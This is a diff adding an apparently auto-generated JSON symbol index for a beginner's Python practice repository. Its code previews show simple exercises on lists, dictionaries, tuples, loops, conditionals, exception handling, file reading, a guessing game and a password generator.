+    {
+        "label": "ages",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "ages = [18,28,38,50,65,8]\nmixedLists = [18,28,\"Andrew\",True]\nnestedLists = [\n    [\"John\",\"Smith\",\"Andrew\",\"July\"],\n    [18,28,38,50,65]\n]\n# print(names)\n# print(ages)\n# print(mixedLists)\n# names[1] = \"David\"",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "mixedLists",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "mixedLists = [18,28,\"Andrew\",True]\nnestedLists = [\n    [\"John\",\"Smith\",\"Andrew\",\"July\"],\n    [18,28,38,50,65]\n]\n# print(names)\n# print(ages)\n# print(mixedLists)\n# names[1] = \"David\"\n# names.append(\"Ben\")",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "nestedLists",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "nestedLists = [\n    [\"John\",\"Smith\",\"Andrew\",\"July\"],\n    [18,28,38,50,65]\n]\n# print(names)\n# print(ages)\n# print(mixedLists)\n# names[1] = \"David\"\n# names.append(\"Ben\")\n# lastElement = names.pop()",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "sumeOfLists",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "sumeOfLists = nestedLists[0] + nestedLists[1]\n# print(sumeOfLists) \nmultipleLists = nestedLists[1] * 2\n# print(multipleLists)\nfromToList = ages[:2]\nprint(len(ages))\nprint(fromToList)",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "multipleLists",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "multipleLists = nestedLists[1] * 2\n# print(multipleLists)\nfromToList = ages[:2]\nprint(len(ages))\nprint(fromToList)",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "fromToList",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "fromToList = ages[:2]\nprint(len(ages))\nprint(fromToList)",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
+    {
+        "label": "data",
+        "kind": 5,
+        "importPath": "refeatLessons.objectASdictionary",
+        "description": "refeatLessons.objectASdictionary",
+        "peekOfCode": "data = {\n    \"John\":2800,\n    \"july\":1500,\n    \"Simon\":3500,\n    \"salary\":[100,200,300,400,500]\n}\nfriends = {\n    \"boys\":[\"Gag\",\"Armen\",\"Vzgo\",\"Davo\"],\n    \"july\":1500,\n    \"Simon\":3500,",
+        "detail": "refeatLessons.objectASdictionary",
+        "documentation": {}
+    },
+    {
+        "label": "friends",
+        "kind": 5,
+        "importPath": "refeatLessons.objectASdictionary",
+        "description": "refeatLessons.objectASdictionary",
+        "peekOfCode": "friends = {\n    \"boys\":[\"Gag\",\"Armen\",\"Vzgo\",\"Davo\"],\n    \"july\":1500,\n    \"Simon\":3500,\n    \"salary\":[100,200,300,400,500]\n}\n# print(data)\n# print(len(data))\n# print(len(data[\"salary\"]))\n# print(data[\"salary\"][2:])",
+        "detail": "refeatLessons.objectASdictionary",
+        "documentation": {}
+    },
+    {
+        "label": "keysData",
+        "kind": 5,
+        "importPath": "refeatLessons.objectASdictionary",
+        "description": "refeatLessons.objectASdictionary",
+        "peekOfCode": "keysData = data.keys()\nvaluesData = list(data.values())\nprint(valuesData[0]) #this not give error #this give error \nprint(keysData[0]) #this give error \n# print(keysData)\n# print(valuesData)\n# print(type(valuesData))",
+        "detail": "refeatLessons.objectASdictionary",
+        "documentation": {}
+    },
+    {
+        "label": "valuesData",
+        "kind": 5,
+        "importPath": "refeatLessons.objectASdictionary",
+        "description": "refeatLessons.objectASdictionary",
+        "peekOfCode": "valuesData = list(data.values())\nprint(valuesData[0]) #this not give error #this give error \nprint(keysData[0]) #this give error \n# print(keysData)\n# print(valuesData)\n# print(type(valuesData))",
+        "detail": "refeatLessons.objectASdictionary",
+        "documentation": {}
+    },
+    {
+        "label": "generatePassword",
+        "kind": 2,
+        "importPath": "refeatLessons.passwordGenerator",
+        "description": "refeatLessons.passwordGenerator",
+        "peekOfCode": "def generatePassword(length):\n    print(\"Enter the Password length\")\n    asciiNumber = string.ascii_letters\n    digits = string.digits\n    totalChars = asciiNumber + digits\n    password = \"\"\n    # groupings = [for char in totalChars]\n    # print(groupings,\"groupings\")\n    for char in range(length):\n        # ranomNum = random.randint(0,len(totalChars) -1)",
+        "detail": "refeatLessons.passwordGenerator",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "refeatLessons.passwordGenerator",
+        "description": "refeatLessons.passwordGenerator",
+        "peekOfCode": "def main():\n    while True :\n        print(\"Enter the Password length\")\n        theLength = input()\n        try:\n            theLength = int(theLength)\n        except Exception as err:\n            print(err)\n            continue\n        thePassword = generatePassword(theLength)",
+        "detail": "refeatLessons.passwordGenerator",
+        "documentation": {}
+    },
+    {
+        "label": "changeString",
+        "kind": 2,
+        "importPath": "refeatLessons.tryExcept",
+        "description": "refeatLessons.tryExcept",
+        "peekOfCode": "def changeString():\n    try:\n        myString += \" from Davit\"\n        return myString\n    except Exception as error:\n        print(\"Error occurred:\", error)\n    finally:\n        print(\"Finally ...\")\nprint(changeString())",
+        "detail": "refeatLessons.tryExcept",
+        "documentation": {}
+    },
+    {
+        "label": "myString",
+        "kind": 5,
+        "importPath": "refeatLessons.tryExcept",
+        "description": "refeatLessons.tryExcept",
+        "peekOfCode": "myString = \"helo world\"\ndef changeString():\n    try:\n        myString += \" from Davit\"\n        return myString\n    except Exception as error:\n        print(\"Error occurred:\", error)\n    finally:\n        print(\"Finally ...\")\nprint(changeString())",
+        "detail": "refeatLessons.tryExcept",
+        "documentation": {}
+    },
+    {
+        "label": "month",
+        "kind": 5,
+        "importPath": "refeatLessons.tupleAndElIf",
+        "description": "refeatLessons.tupleAndElIf",
+        "peekOfCode": "month = \"junyar\",\"febuari\",\"march\"\nmonthDat = 1,2,3,4,5,6,7,8,9,10,11,12\ncomand = input()\nlogin = False\nif comand == \"1\":\n    print(\"open Home Page\")\nelif comand == \"2\" and not login:\n    print(\"open Settings Page\")\nelif comand == \"8\" or comand == \"9\":\n    print(\"comand is \" + comand)",
+        "detail": "refeatLessons.tupleAndElIf",
+        "documentation": {}
+    },
+    {
+        "label": "monthDat",
+        "kind": 5,
+        "importPath": "refeatLessons.tupleAndElIf",
+        "description": "refeatLessons.tupleAndElIf",
+        "peekOfCode": "monthDat = 1,2,3,4,5,6,7,8,9,10,11,12\ncomand = input()\nlogin = False\nif comand == \"1\":\n    print(\"open Home Page\")\nelif comand == \"2\" and not login:\n    print(\"open Settings Page\")\nelif comand == \"8\" or comand == \"9\":\n    print(\"comand is \" + comand)\nelse:",
+        "detail": "refeatLessons.tupleAndElIf",
+        "documentation": {}
+    },
+    {
+        "label": "comand",
+        "kind": 5,
+        "importPath": "refeatLessons.tupleAndElIf",
+        "description": "refeatLessons.tupleAndElIf",
+        "peekOfCode": "comand = input()\nlogin = False\nif comand == \"1\":\n    print(\"open Home Page\")\nelif comand == \"2\" and not login:\n    print(\"open Settings Page\")\nelif comand == \"8\" or comand == \"9\":\n    print(\"comand is \" + comand)\nelse:\n    print(\"Ends\")",
+        "detail": "refeatLessons.tupleAndElIf",
+        "documentation": {}
+    },
+    {
+        "label": "login",
+        "kind": 5,
+        "importPath": "refeatLessons.tupleAndElIf",
+        "description": "refeatLessons.tupleAndElIf",
+        "peekOfCode": "login = False\nif comand == \"1\":\n    print(\"open Home Page\")\nelif comand == \"2\" and not login:\n    print(\"open Settings Page\")\nelif comand == \"8\" or comand == \"9\":\n    print(\"comand is \" + comand)\nelse:\n    print(\"Ends\")",
+        "detail": "refeatLessons.tupleAndElIf",
+        "documentation": {}
+    },
+    {
+        "label": "myFile",
+        "kind": 5,
+        "importPath": "working_with_files.files",
+        "description": "working_with_files.files",
+        "peekOfCode": "myFile = open(\"users.txt\",\"r\")\nprint(myFile.readline())\nprint(myFile.readline())\nmyFile.close()\n'''\n'''\nread all line\nwith open(\"users.txt\",\"r\") as myFile:\n    for line in range(10):\n        print(myFile.readlines())",
+        "detail": "working_with_files.files",
+        "documentation": {}
+    },
+    {
+        "label": "my_list",
+        "kind": 5,
+        "importPath": "arrayList",
+        "description": "arrayList",
+        "peekOfCode": "my_list = [1, 2, 3]\n# # append\n# my_list.append(4)\n# # extend\n# my_list.extend([5, 6])\n# insert\n# my_list.insert(0, 0)\n# remove \n# my_list.remove(2)\n# # pop",
+        "detail": "arrayList",
+        "documentation": {}
+    },
+    {
+        "label": "friend",
+        "kind": 5,
+        "importPath": "for_loops",
+        "description": "for_loops",
+        "peekOfCode": "friend = [\"Davit\",\"Gagik\",\"Vazgen\",\"Armen\",\"Robert\"]\n'''\nfor name in friend:\n    print(name)\n'''\n# for index, name in enumerate(friend):\n#     print(\"Index:\", index, \"Name:\", name)\n# total = 0\n# for number in range(5,8): \n#     total += number",
+        "detail": "for_loops",
+        "documentation": {}
+    },
+    {
+        "label": "generateNumber",
+        "kind": 2,
+        "importPath": "guess_the_number_game",
+        "description": "guess_the_number_game",
+        "peekOfCode": "def generateNumber():\n    randomNumber = random.randint(0,10)\n    return randomNumber\ndef main():\n    theNumber = generateNumber()\n    while True:\n        print(\"Guess the number\")\n        print(theNumber)\n        point = input()\n        try:",
+        "detail": "guess_the_number_game",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "guess_the_number_game",
+        "description": "guess_the_number_game",
+        "peekOfCode": "def main():\n    theNumber = generateNumber()\n    while True:\n        print(\"Guess the number\")\n        print(theNumber)\n        point = input()\n        try:\n            point = int(point)\n        except Exception as error :\n            print(\"exception error =>\",error)",
+        "detail": "guess_the_number_game",
+        "documentation": {}
+    },
+    {
+        "label": "fib",
+        "kind": 2,
+        "importPath": "helloworld",
+        "description": "helloworld",
+        "peekOfCode": "def fib(n):\n    a, b = 0, 1\n    while a < n:\n        print(a, end=' ')\n        a, b = b, a + b\n    print()  # This print() is inside the while loop\nfib(10)\nif (5 > 2):\n    print(\"Five is greater than two!\")",
+        "detail": "helloworld",
+        "documentation": {}
+    },
+    {
+        "label": "comand",
+        "kind": 5,
+        "importPath": "ifElse",
+        "description": "ifElse",
+        "peekOfCode": "comand = input()\nlogin = True\nif (comand == 1): \n    print(\"open home page\")\nelif (comand == 2 and login == True) : \n    print(\"Open settings page\")\nelif (comand == 3 and login == True) : \n    print(\"Open settings page\")\nelif (comand == 4 or login == True) and 5 < 6 : \n    print(\"Open Profile page\")",
+        "detail": "ifElse",
+        "documentation": {}
+    },
+    {
+        "label": "login",
+        "kind": 5,
+        "importPath": "ifElse",
+        "description": "ifElse",
+        "peekOfCode": "login = True\nif (comand == 1): \n    print(\"open home page\")\nelif (comand == 2 and login == True) : \n    print(\"Open settings page\")\nelif (comand == 3 and login == True) : \n    print(\"Open settings page\")\nelif (comand == 4 or login == True) and 5 < 6 : \n    print(\"Open Profile page\")\nelse : ",
+        "detail": "ifElse",
+        "documentation": {}
+    },
+    {
+        "label": "#",
+        "kind": 5,
+        "importPath": "octal_8",
+        "description": "octal_8",
+        "peekOfCode": "# = V\n# octal 457 => (7 * 8 ** 0) + (5 * 8 ** 1) + (4 * 8 ** 2) => decimal 303\n# print((7 * 8 ** 0) + (5 * 8 ** 1) + (4 * 8 ** 2))",
+        "detail": "octal_8",
+        "documentation": {}
+    },
+    {
+        "label": "dirpath",
+        "kind": 5,
+        "importPath": "OS",
+        "description": "OS",
+        "peekOfCode": "dirpath = os.getcwd()\nprint(dirpath)",
+        "detail": "OS",
+        "documentation": {}
+    },
+    {
+        "label": "generatePassword",
+        "kind": 2,
+        "importPath": "passwordGenerator",
+        "description": "passwordGenerator",
+        "peekOfCode": "def generatePassword(theLength):\n    \"\"\" This function generates a password of the specified length.\"\"\"\n    letters = string.ascii_letters\n    digits = string.digits\n    totalChars = letters + digits\n    password = \"\"\n    for index, i in enumerate(range(theLength)):\n        # randomNumber = random.randint(0, len(totalChars) - 1)\n        # password += totalChars[randomNumber]\n        password += random.choice(totalChars)",
+        "detail": "passwordGenerator",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "passwordGenerator",
+        "description": "passwordGenerator",
+        "peekOfCode": "def main():\n    while True :\n        print(\"Enter the password length\")\n        theLength = input()\n        try:\n            theLength = int(theLength)\n        except Exception as error:\n            print(\"Wrong password length\",error)\n        thePassword = generatePassword(theLength)\n        print(f\"the password this {thePassword}\" )",
+        "detail": "passwordGenerator",
+        "documentation": {}
+    },
+    {
+        "label": "name",
+        "kind": 5,
+        "importPath": "tuply",
+        "description": "tuply",
+        "peekOfCode": "name = (\"john\",\"smith\",\"Davit\")\nmixedTuple = 11, 22, 33\narray = [10,20,30]\ntypeNAme = type(array)\nprint(typeNAme)",
+        "detail": "tuply",
+        "documentation": {}
+    },
+    {
+        "label": "mixedTuple",
+        "kind": 5,
+        "importPath": "tuply",
+        "description": "tuply",
+        "peekOfCode": "mixedTuple = 11, 22, 33\narray = [10,20,30]\ntypeNAme = type(array)\nprint(typeNAme)",
+        "detail": "tuply",
+        "documentation": {}
+    },
+    {
+        "label": "array",
+        "kind": 5,
+        "importPath": "tuply",
+        "description": "tuply",
+        "peekOfCode": "array = [10,20,30]\ntypeNAme = type(array)\nprint(typeNAme)",
+        "detail": "tuply",
+        "documentation": {}
+    },
+    {
+        "label": "typeNAme",
+        "kind": 5,
+        "importPath": "tuply",
+        "description": "tuply",
+        "peekOfCode": "typeNAme = type(array)\nprint(typeNAme)",
+        "detail": "tuply",
+        "documentation": {}
+    },
+    {
+        "label": "count",
+        "kind": 5,
+        "importPath": "while_loop",
+        "description": "while_loop",
+        "peekOfCode": "count = -1\nwhile count < 10:\n    count+=1\n    if count == 5 :\n        continue\n    print(str(count) + \"Hello world\")  \n'''\n# while True :\n#     print(\"1. Settings\")\n#     print(\"2. Home\")",
+        "detail": "while_loop",
+        "documentation": {}
+    }
+]
